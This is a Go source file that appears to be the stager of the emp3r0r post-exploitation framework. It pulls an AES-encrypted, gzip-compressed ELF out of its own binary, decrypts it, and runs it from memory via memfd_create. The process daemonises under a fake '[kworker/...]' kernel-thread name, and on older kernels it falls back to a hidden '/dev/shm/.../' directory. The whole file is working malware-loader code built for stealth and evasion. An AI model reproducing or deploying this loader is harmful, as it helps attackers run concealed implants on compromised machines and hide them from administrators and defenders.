//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

const (
	mfdCloexec     = 0x0001
	memfdCreateX64 = 319
	fork           = 57
)

func memfd_exec(procName string, buffer []byte) {
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
	case 0:
		break
	case 1:
		// Fork failed!
		log.Fatal("fork failed")
	default:
		// Parent exiting...
		os.Exit(0)
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
	err := syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	if err != nil {
		log.Fatal(err)
	}
	file.Close()

	progWithArgs := append([]string{procName}, os.Args[1:]...)
	err = syscall.Exec(fdPath, progWithArgs, nil)
	if err == nil {
		log.Println("agent started from memory using memfd_create")
		return
	}

	// older kernel
	log.Printf("memfd_create failed: %v, trying shm_open", err)
	shmPath := "/dev/shm/.../"
	if _, err := os.Stat(shmPath); os.IsNotExist(err) {
		err = os.Mkdir(shmPath, 0700)
		if err != nil {
			log.Fatal(err)
		}
	}
	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
	if err != nil {
		log.Fatal(err)
	}
	err = os.Chdir(shmPath)
	if err != nil {
		log.Fatal(err)
	}
	cmd := exec.Command(procName, os.Args[1:]...)
	cmd.Env = os.Environ()
	err = cmd.Start()
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	// find embeded ELF
	encElfBytes, err := util.DigEmbeddedDataFromArg0()
	if err != nil {
		e := err
		log.Printf("DigEmbeddedDataFromArg0: %v", err)
		encElfBytes, err = util.DigEmbededDataFromMem()
		if err != nil {
			log.Fatalf("DigEmbeddedDataFromArg0: %v. DigEmbededDataFromMem: %v", e, err)
		}
	}

	// decrypt attached ELF file
	key := tun.GenAESKey(emp3r0r_data.MagicString)
	elfdata := tun.AESDecryptRaw(key, encElfBytes)
	if elfdata == nil {
		log.Fatal("AESDecrypt failed")
	}

	// decompress
	var decompressedBytes []byte
	gz := &archiver.Gz{CompressionLevel: 9}
	r := bytes.NewReader(elfdata)
	w := bytes.NewBuffer(decompressedBytes)
	err = gz.Decompress(r, w)
	if err != nil {
		log.Fatalf("Decompress ELF: %v", err)
	}

	// run from memfd
	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
	memfd_exec(procName, w.Bytes())

	// write self to memfd
	self_elf_data, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		log.Printf("read self: %v", err)
	}
	fd := util.MemFDWrite(self_elf_data)
	if fd < 0 {
		log.Print("MemFDWrite failed")
	}
}
